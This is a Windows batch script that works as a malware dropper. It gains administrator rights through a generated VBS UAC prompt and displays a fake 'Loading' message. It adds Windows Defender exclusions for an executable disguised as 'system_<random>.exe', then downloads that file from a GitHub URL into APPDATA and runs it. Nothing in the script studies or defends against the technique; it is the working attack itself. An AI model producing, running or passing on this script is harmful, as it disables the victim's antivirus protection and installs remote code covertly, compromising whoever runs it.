

@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
echo Loading.... Don't close this windown
set "base_filename=system"
set "random_suffix=%RANDOM%"
set "final_filename=%base_filename%_%random_suffix%.exe"

powershell.exe -Command "Set-MpPreference -ExclusionProcess  '%final_filename%'"
powershell.exe -Command "Add-MpPreference -ExclusionPath '%APPDATA%\\%final_filename%'"
::cd %TEMP%
cd %APPDATA%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/tt92threestick/tt_net/refs/heads/main/installer.exe' -OutFile '%APPDATA%\\%final_filename%'"
"%APPDATA%\\%final_filename%"
exit
